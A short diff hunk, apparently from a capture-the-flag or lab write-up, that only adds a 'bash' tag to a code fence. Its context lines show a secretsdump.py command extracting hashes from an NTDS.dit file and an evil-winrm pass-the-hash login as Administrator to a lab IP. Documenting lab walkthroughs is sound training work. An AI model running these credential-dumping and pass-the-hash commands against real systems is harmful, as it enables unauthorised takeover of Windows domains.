@@ -195,7 +195,7 @@ secretsdump.py -system system -ntds ntds.dit local
 
 Access as administrator
 
-```
+```bash
 evil-winrm -i 10.10.89.186 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
 ```
 
